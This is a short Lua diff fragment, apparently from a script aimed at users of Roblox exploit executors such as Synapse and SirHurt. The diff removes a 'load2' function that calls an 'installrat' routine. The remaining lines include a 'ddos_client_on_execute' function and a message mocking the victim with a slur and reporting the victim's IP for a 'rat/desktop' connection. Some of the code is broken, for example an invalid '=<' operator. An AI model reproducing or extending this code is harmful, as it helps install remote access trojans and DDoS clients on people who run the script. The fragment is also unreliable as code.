@@ -25,15 +25,6 @@ function load(...)
   return "Retard executed the script. He will regret! Connection IP to rat/desktop: "..args.getIp
 end
 
-function load2(...)
-  local args = {...}
-  local getloader1 = args.load
-  if not getloader1 and args =< 1 then return false end
-  getloader1.getIp = function() return "ipify" end
-  getloader1.installrat = getloader.installrat
-  return getloader1.installrat(...)
-end
-
 function ddos_client_on_execute(isSynapse, isProto, isSentinel, isSirhurt, ...)
     local args = {...}
     if isSynapse then
